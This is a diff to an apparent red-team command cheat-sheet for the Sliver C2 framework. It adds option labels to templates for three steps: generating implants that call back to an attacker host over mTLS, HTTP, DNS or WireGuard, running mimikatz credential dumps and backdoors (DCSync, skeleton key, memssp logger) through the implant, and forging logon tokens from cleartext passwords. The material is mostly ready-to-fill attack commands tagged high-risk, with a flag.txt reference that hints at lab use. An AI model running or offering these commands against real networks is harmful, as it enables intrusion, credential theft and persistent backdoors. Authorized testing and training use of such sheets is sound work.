@@ -32,7 +32,7 @@ sliver client
 Build a Sliver implant for the chosen transport (mtls/http/tcp-pivot), OS, and name. `--skip-symbols` shrinks the binary at the cost of debug info.
 
 ```bash
-generate --{{TYPE:choice:mtls,http,https,dns,wg}} {{LHOST:ip}}:{{LPORT:port:443}} --os {{OS:choice:windows,linux,darwin}} -N {{NAME:str:win}} {{TEMPLATE:str:--skip-symbols}}
+generate --{{TYPE:choice:mtls=mutual TLS C2,http=plain HTTP C2,https=TLS wrapped C2,dns=DNS tunnel C2,wg=WireGuard tunnel}} {{LHOST:ip}}:{{LPORT:port:443}} --os {{OS:choice:windows=Windows target,linux=Linux target,darwin=macOS target}} -N {{NAME:str:win}} {{TEMPLATE:str:--skip-symbols}}
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=sliver,generate,implant,mtls -->
@@ -219,7 +219,7 @@ download {{REMOTE_FILE:str:C:\Users\Administrator\Desktop\flag.txt}}
 Run a mimikatz command through the implant's built-in module (e.g. dump logon passwords, DPAPI, SAM/LSA secrets).
 
 ```bash
-mimikatz {{MIMICOMMANDS:choice:sekurlsa::logonpasswords,sekurlsa::wdigest,sekurlsa::tickets,sekurlsa::pth,lsadump::sam,lsadump::secrets,lsadump::lsa,lsadump::dcsync,kerberos::list,kerberos::purge,privilege::debug,token::elevate,misc::skeleton,misc::memssp}}
+mimikatz {{MIMICOMMANDS:choice:sekurlsa::logonpasswords=LSASS logon creds,sekurlsa::wdigest=wdigest cleartext,sekurlsa::tickets=Kerberos tickets,sekurlsa::pth=pass-the-hash,lsadump::sam=local SAM hashes,lsadump::secrets=LSA secrets,lsadump::lsa=LSA cache dump,lsadump::dcsync=DCSync attack,kerberos::list=list tickets,kerberos::purge=clear tickets,privilege::debug=grant SeDebug,token::elevate=SYSTEM token,misc::skeleton=skeleton key backdoor,misc::memssp=memssp cred logger}}
 ```
 
 <!-- meta: risk=high | phase=post | tags=sliver,mimikatz,credentials,dump -->
@@ -230,7 +230,7 @@ mimikatz {{MIMICOMMANDS:choice:sekurlsa::logonpasswords,sekurlsa::wdigest,sekurl
 Forge a logon token from cleartext credentials. Use `.` as domain for local accounts; pick the LOGON_* type matching the target service.
 
 ```bash
-make-token -d {{DOMAIN:str:CORP.LOCAL}} -u {{USER:str:Administrator}} -p '{{PASS:str:Password123}}' --logon-type {{LOGON_TYPE:choice:LOGON_NEW_CREDENTIALS,LOGON_INTERACTIVE,LOGON_NETWORK,LOGON_NETWORK_CLEARTEXT,LOGON_BATCH,LOGON_SERVICE,LOGON_UNLOCK}}
+make-token -d {{DOMAIN:str:CORP.LOCAL}} -u {{USER:str:Administrator}} -p '{{PASS:str:Password123}}' --logon-type {{LOGON_TYPE:choice:LOGON_NEW_CREDENTIALS=OverPTH-style new creds,LOGON_INTERACTIVE=interactive console,LOGON_NETWORK=network auth,LOGON_NETWORK_CLEARTEXT=network + cleartext,LOGON_BATCH=scheduled task,LOGON_SERVICE=service account,LOGON_UNLOCK=workstation unlock}}
 ```
 
 <!-- meta: risk=high | phase=post | tags=sliver,token,credentials,impersonate -->
